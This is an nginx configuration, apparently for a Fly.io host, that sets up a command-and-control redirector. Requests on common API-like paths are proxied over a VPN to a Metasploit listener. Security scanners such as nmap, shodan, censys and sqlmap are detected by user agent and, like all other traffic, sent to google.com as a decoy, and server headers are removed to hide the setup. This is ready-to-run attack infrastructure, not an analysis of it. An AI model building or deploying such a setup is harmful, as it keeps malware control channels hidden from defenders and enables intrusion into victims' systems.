load_module modules/ngx_http_headers_more_filter_module.so;

user www-data;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    server_tokens off;
    more_clear_headers Server;

    # Fly.io sends Proxy Protocol v1 before the TLS handshake on port 443.
    # $proxy_protocol_addr contains the real client IP.
    # Trusted proxies: Fly.io internal range 172.16.0.0/12.
    set_real_ip_from  172.16.0.0/12;
    real_ip_header    proxy_protocol;

    log_format combined_real '$proxy_protocol_addr - $remote_user [$time_local] '
                              '"$request" $status $body_bytes_sent '
                              '"$http_referer" "$http_user_agent"';

    access_log /var/log/nginx/access.log combined_real;
    error_log  /var/log/nginx/error.log;

    # Redirect HTTP → HTTPS
    server {
        listen 80 default_server;
        server_name _;

        # ACME challenge pour Let's Encrypt (acme.sh webroot)
        location ^~ /.well-known/acme-challenge/ {
            root /var/www/acme;
            default_type "text/plain";
            try_files $uri =404;
        }

        # Health check interne (évite les erreurs SSL sur le probe Fly.io)
        location = /healthz {
            return 200 "ok\n";
            add_header Content-Type text/plain;
        }

        location / {
            return 302 https://www.google.com/;
        }
    }

    server {
        listen 443 ssl proxy_protocol default_server;
        server_name _;

        ssl_certificate     /etc/nginx/ssl/server.crt;
        ssl_certificate_key /etc/nginx/ssl/server.key;
        ssl_protocols       TLSv1.2 TLSv1.3;
        ssl_ciphers         HIGH:!aNULL:!MD5;

        # Block known scanners
        if ($http_user_agent ~* "(curl|python-requests|python-urllib|nmap|masscan|zgrab|shodan|censys|zmap|nuclei|nikto|sqlmap|dirbuster|gobuster|wfuzz)") {
            return 302 https://www.google.com/;
        }

        # C2 URI patterns — proxy to MSF via VPN
        location ~* "^/(api|update|assets|cdn|upload|download|v[0-9]+)/" {
            proxy_pass          https://${MSF_VPN_IP}:${MSF_VPN_PORT};
            proxy_ssl_verify    off;
            proxy_set_header    Host $http_host;
            proxy_set_header    X-Real-IP $remote_addr;
            proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_connect_timeout 10s;
            proxy_read_timeout  60s;
        }

        # Everything else → lure
        location / {
            return 302 https://www.google.com/;
        }
    }
}
